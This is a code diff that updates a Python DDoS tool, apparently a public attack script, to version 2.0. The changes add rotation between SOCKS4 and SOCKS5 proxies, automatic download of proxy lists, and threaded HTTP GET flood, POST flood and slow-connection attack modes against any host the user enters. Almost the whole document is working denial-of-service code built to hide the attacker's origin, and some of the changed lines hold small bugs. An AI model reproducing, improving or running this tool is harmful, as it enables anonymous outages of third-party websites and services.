@@ -17,7 +17,7 @@ print ('''
      CC/////  CC/////   | ddos tool |/ 
       CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 1.9 (Add Socks5 Checker)
+Python3 version 2.0 (Improved socks4)
                             C0d3d by Lee0n123
 ===============================================
        --> Use 443 Port Auto Enable SSL <--
@@ -176,35 +176,29 @@ acceptall = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
 		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
 
-def cc():
+def cc(socks_type):
 	get_host = "GET " + url2 + "?=" + str(random.randint(0,20000)) + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 	connection = "Connection: Keep-Alive\r\n"
 	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
 	accept = random.choice(acceptall)
 	referer = "Referer: https://www.google.com/search?q="+ ip + url2 + "\r\n"
 	request = get_host + referer + useragent + accept + connection + "\r\n"
-	proxy = random.choice(proxies).strip().split(":")
+	time.sleep(3)#Delay
+	if socks_type == 4:
+		proxy = random.choice(socks4_proxies).strip().split(":")
+		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+	if socks_type == 5:
+		proxy = random.choice(socks5_proxies).strip().split(":")
+		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+	time.sleep(3)
+	err = 0
 	while True:
-		try:
-			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
-			s = socks.socksocket()
-			s.connect((str(ip), int(port)))
-			if str(port) == '443':
-				s = ssl.wrap_socket(s)
-				n = "HTTPS"
-			else:
-				n = "CC"
-			s.send(str.encode(request))
-			print ("[*] "+n+" Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
+		while on:
 			try:
-				for y in range(multiple):
-					s.send(str.encode(request))
-			except:
-				s.close()
-		except:
-			s.close()
-			try:
-				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+				if err > 3:
+					print("[!] Target or proxy maybe down| Changing proxy")
+					break
+				s = socks.socksocket()
 				s.connect((str(ip), int(port)))
 				if str(port) == '443':
 					s = ssl.wrap_socket(s)
@@ -219,10 +213,11 @@ def cc():
 				except:
 					s.close()
 			except:
-				print ("[!] Connection Error")
 				s.close()
-
-def post():
+				err = err +1
+		break
+	cc(socks_type)
+def post(socks_type):
 	post_host = "POST " + url2 + "?=" + str(random.randint(0,20000)) + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 	content = "Content-Type: application/x-www-form-urlencoded\r\n"
 	length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
@@ -231,47 +226,49 @@ def post():
 	accept = random.choice(acceptall)
 	#data = str(random._urandom(16)) // You can enable bring data in HTTP Header
 	request = post_host + accept + refer + content + user_agent + length + "\r\n"# + data 
-	proxy = random.choice(proxies).strip().split(":")
+	if socks_type == 4:
+		proxy = random.choice(socks4_proxies).strip().split(":")
+		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+	if socks_type == 5:
+		proxy = random.choice(socks5_proxies).strip().split(":")
+		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+	time.sleep(3)#Delay
+	err = 0
 	while True:
-		try:
-			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
-			s = socks.socksocket()
-			s.connect((str(ip), int(port)))
-			if str(port) == '443': # //AUTO Enable SSL MODE :)
-				s = ssl.wrap_socket(s)
-			else:
-				pass
-			s.send(str.encode(request))
-			print ("[*] HTTP Post Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
+		while on:
 			try:
-				for y in range(multiple):
-					s.send(str.encode(request))
-			except:
-				s.close()
-		except:
-			s.close()
-			try:
-				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+				if err > 3:
+					print("[!] Target or proxy maybe down| Changing proxy")
+					break
 				s = socks.socksocket()
 				s.connect((str(ip), int(port)))
-				if str(port) == '443':
+				if str(port) == '443': # //AUTO Enable SSL MODE :)
 					s = ssl.wrap_socket(s)
 				else:
 					pass
 				s.send(str.encode(request))
-				print ("[*] HTTP Post Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
+				print ("[*] HTTP Post Flooding from  | "+str(proxy[0])+":"+str(proxy[1]))
 				try:
 					for y in range(multiple):
 						s.send(str.encode(request))
 				except:
 					s.close()
 			except:
-				print ("[!] Connection Error")
 				s.close()
+				err = err + 1
+		break
+	post(socks_type)
+
 socket_list=[]
 def slow(conn):
 	for _ in range(conn):
-		proxy = random.choice(proxies).strip().split(":")
+		socks_type = random.randint(4,5)
+		if socks_type == 4:
+			proxy = random.choice(socks4_proxies).strip().split(":")
+			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+		if socks_type == 5:
+			proxy = random.choice(socks5_proxies).strip().split(":")
+			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 		try:
 			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 			s = socks.socksocket()
@@ -295,10 +292,13 @@ def slow(conn):
 			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
 			sys.stdout.flush()
 	for _ in range(conn - len(socket_list)):
-		proxy = random.choice(proxies).strip().split(":")
-		try:
+		if socks_type == 4:
+			proxy = random.choice(socks4_proxies).strip().split(":")
+			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+		if socks_type == 5:
+			proxy = random.choice(socks5_proxies).strip().split(":")
 			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
-			s = socks.socksocket()
+		try:
 			s.settimeout(1)
 			s.connect((str(ip), int(port)))
 			if str(port) == '443':
@@ -314,21 +314,28 @@ def slow(conn):
 			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
 			sys.stdout.flush()
 			pass
-def checking(lines):
+def checking(lines,socks_type):
 	global nums
-	global proxies
+	global socks4_proxies
+	global socks5_proxies
 	proxy = lines.strip().split(":")
-	try:
+	if socks_type == 4:
+		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+	if socks_type == 5:
 		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+	try:
 		s = socks.socksocket()
-		s.settimeout(0.5)#500ms
+		s.settimeout(0.5)#500ms, You can change by yourself
 		s.connect((str(ip), int(port)))
 		if port == 443:
 			s = ssl.wrap_socket(s)
 		s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
 		s.close()
 	except:
-		proxies.remove(lines)
+		if socks_type == 4:
+			socks4_proxies.remove(lines)
+		elif socks_type == 5:
+			socks5_proxies.remove(lines)
 	nums = nums + 1
 
 def check_socks():
@@ -336,32 +343,48 @@ def check_socks():
 	global nums
 	nums = 0
 	thread_list=[]
-	for lines in list(proxies):
-		th = threading.Thread(target=checking,args=(lines,))
+	for lines in list(socks4_proxies):
+		th = threading.Thread(target=checking,args=(lines,4))
 		th.start()
 		thread_list.append(th)
-		time.sleep(0.1)
+		time.sleep(0.03)
 		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
 		sys.stdout.flush()
 	for th in list(thread_list):
 		th.join()
 		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
 		sys.stdout.flush()
-	print("\r\n> Checked all proxies, Total Worked:"+str(len(proxies)))
+	thread_list = []#clear list
+	for lines in list(socks5_proxies):
+		th = threading.Thread(target=checking,args=(lines,5))
+		th.start()
+		thread_list.append(th)
+		time.sleep(0.03)
+		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
+		sys.stdout.flush()
+	for th in list(thread_list):
+		th.join()
+		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
+		sys.stdout.flush()
+	print("\r\n> Checked all proxies, Total Worked:"+str(len(socks5_proxies)+len(socks4_proxies)))
 	ans = input("> Do u want to save them in a file? (y/n)")
 	if ans == "y":
-		in_file = str(input("> Input your filename(socks.txt):"))
-		if in_file == "":
-			in_file = "socks.txt"
-		with open(in_file, 'wb') as fp:
-			for lines in list(proxies):
+		print("> They are saved in socks4.txt and socks5.txt.")
+		with open("socks4.txt", 'wb') as fp:
+			for lines in list(socks4_proxies):
 				fp.write(bytes(lines,encoding='utf8'))
 		fp.close()
+		with open("socks5.txt", 'wb') as fp:
+			for lines in list(socks5_proxies):
+				fp.write(bytes(lines,encoding='utf8'))
+		fp.close()
+
 def main():
 	global ip
 	global url2
 	global port
-	global proxies
+	global socks4_proxies
+	global socks5_proxies
 	global multiple
 	mode = str(input("> Choose Your Mode (cc/post/slow) :"))
 	ip = str(input("> Host/Ip:"))
@@ -378,43 +401,59 @@ def main():
 		if str(port) == '443':
 			print(" [!] Enable SSL Mode")
 	thread_num = int(input("> Threads:"))
-	N = str(input("> Do you need to get socks5 list?(y/n):"))
+	N = str(input("> Do you need to get socks list?(y/n):"))
 	if N == 'y':
-		r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all")
-		with open("socks.txt",'wb') as f:
+		r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&timeout=1000")
+		with open("socks4.txt",'wb') as f:
 			f.write(r.content)
-			print("\r\n [!] Have already download socks5 list as socks.txt\r\n")
+			print("> Have already downloaded socks4 list as socks4.txt")
+		r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all&timeout=1000")
+		with open("socks5.txt",'wb') as f:
+			f.write(r.content)
+			print("> Have already downloaded socks5 list as socks5.txt")
 	else:
 		pass
-	out_file = str(input("> Proxy file path(socks.txt):"))
+	out_file = str(input("> Socks4 Proxy file path(socks4.txt):"))
 	if out_file == '':
-		out_file = str("socks.txt")
+		out_file = str("socks4.txt")
 	else:
 		out_file = str(out_file)
-	proxies = open(out_file).readlines()
-	print ("> Number Of Proxies: %s" %(len(proxies)))
+	socks4_proxies = open(out_file).readlines()
+	out2_file = str(input("> Socks5 Proxy file path(socks5.txt):"))
+	if out2_file == '':
+		out2_file = str("socks5.txt")
+	else:
+		out2_file = str(out_file)
+	socks5_proxies = open(out2_file).readlines()
+	print ("> Number Of Socks4/5 Proxies: %s" %(len(socks4_proxies)+len(socks5_proxies)))
 	time.sleep(0.03)
-	ans = str(input("> Do u need to check socks list?(y/n)"))
+	ans = str(input("> Do u need to check the socks list?(y/n)"))
+	if url == '':
+		url2 = "/"
+	else:
+		url2 = str(url)
 	if ans == "y":
 		check_socks()
 	if mode == "slow":
 		slow(thread_num)
 	multiple = int(input("> Input the Magnification:"))
-	if url == '':
-		url2 = "/"
-	else:
-		url2 = str(url)
+	input("Press Enter to continue.")
 	if mode == "post":
 		for i in range(thread_num):
-			th = threading.Thread(target = post)
+			th = threading.Thread(target = post,args=(random.randint(4,5),))
 			th.start()
+			print("Threads "+str(i+1)+" created")
 	elif mode == "cc":
 		for i in range(thread_num):
-			th = threading.Thread(target = cc)
+			th = threading.Thread(target = cc,args=(random.randint(4,5),))
 			th.start()
+			print("Threads "+str(i+1)+" created")
 	else:
 		print("[!] Input Error")
 		sys.exit()
+	time.sleep(3)#for all threads ready
+	global on 
+	on = True
 
 if __name__ == "__main__":
 	main()
